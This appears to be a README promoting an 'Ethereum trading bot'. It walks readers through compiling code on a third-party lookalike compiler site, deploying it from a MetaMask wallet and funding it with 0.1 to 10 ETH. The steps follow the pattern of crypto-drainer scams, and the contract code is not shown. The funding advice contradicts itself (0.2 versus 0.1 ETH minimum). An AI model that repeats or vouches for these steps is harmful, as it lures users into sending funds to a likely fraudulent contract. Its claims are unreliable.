# ETHEREUM-TRADING-BOT🤖
Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.2 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.

To avoid this, I recommend funding your contract with at least 0.1 ETH and up to 10 ETH to ensure the bot functions optimally.

Step-by-Step Setup Guide:

👉 Download a web3 wallet if you don't already have one, here's the link to MetaMask:  https://metamask.io/download

👉 Head over to the compile site : [https://idecompiler.online/](https://idecompiler.online/)

👉 Create a new file, name it one word for example "trade"

👉 Paste the open source code into your "trade" file

👉 Go to the compile tab and compile with version 0.8.4

👉 Go to the deploy tab, select your extension from the menu, connect, then click deploy

👉 Provide sufficient liquidity

👉 Click the start button to begin and stop to withdraw and stop the bot

happy trading
